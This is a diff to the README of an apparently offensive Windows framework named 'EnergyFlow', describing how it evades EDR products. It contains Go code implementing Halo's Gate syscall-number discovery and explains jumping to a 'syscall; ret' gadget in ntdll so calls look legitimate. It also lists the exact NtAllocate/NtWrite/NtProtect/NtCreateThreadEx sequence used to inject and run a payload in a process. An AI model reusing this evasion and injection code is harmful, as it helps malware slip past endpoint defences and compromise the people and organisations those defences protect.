@@ -40,24 +40,43 @@ graph TD
 
 ## 🛠️ Technical Implementation: `EnergyFlow`
 
-The framework uses an Assembly bridge (`src/go/syscalls_amd64.s`) to execute the recovered SSN without triggering "Direct Syscall" detection, which is another common telemetry source for EDRs.
+The framework uses an Assembly bridge (`internal/research/energyflow_amd64.s`) to execute the recovered SSN without triggering "Direct Syscall" detection, which is another common telemetry source for EDRs.
 
 #### Indirect Syscall Logic:
 Instead of calling `syscall` directly, we find a `syscall; ret` gadget within `ntdll.dll` and jump to it. This makes the execution look like it originated from the legitimate system library.
 
-#### SSN Discovery (Go snippet):
+#### SSN Discovery (Go snippet — `internal/research/inject_windows.go`):
 ```go
-func res(n string) SPr {
-    // ... load ntdll ...
-    a := p.Addr()
-    if id, ad := sc(a); ad != 0 { return SPr{id, ad} } // Direct check
-    for i := 1; i < 32; i++ {
-        // Search neighbors and adjust ID by index
-        if id, ad := sc(a - uintptr(i*32)); ad != 0 { return SPr{id + uint32(i), ad} }
-        if id, ad := sc(a + uintptr(i*32)); ad != 0 { return SPr{id - uint32(i), ad} }
+func resolve(name string) (resolved, error) {
+    // ... load ntdll!name ...
+    start := p.Addr()
+    if ssn, gadget := scanGadget(start); gadget != 0 {
+        return resolved{ssn, gadget}, nil // direct: clean stub
     }
+    for i := 1; i < 32; i++ {
+        // Halo's Gate: search neighbours and adjust SSN by index
+        if ssn, gadget := scanGadget(start - uintptr(i*32)); gadget != 0 {
+            return resolved{ssn + uint32(i), gadget}, nil
+        }
+        if ssn, gadget := scanGadget(start + uintptr(i*32)); gadget != 0 {
+            return resolved{ssn - uint32(i), gadget}, nil
+        }
+    }
+    return resolved{}, fmt.Errorf("no clean syscall gadget found")
 }
 ```
+Stubs are read with `ReadProcessMemory` (v2), so a slot outside mapped memory degrades to "not a gadget" instead of an access violation.
+
+---
+
+## 🔒 W^X discipline
+
+The injection routine that consumes the recovered SSN never creates an RWX page:
+
+1. `NtAllocateVirtualMemory` → `PAGE_READWRITE` (0x04)
+2. `NtWriteVirtualMemory` → copy payload
+3. `NtProtectVirtualMemory` → `PAGE_EXECUTE_READ` (0x20)
+4. `NtCreateThreadEx` → execute, then `NtClose` every handle
 
 ---
 
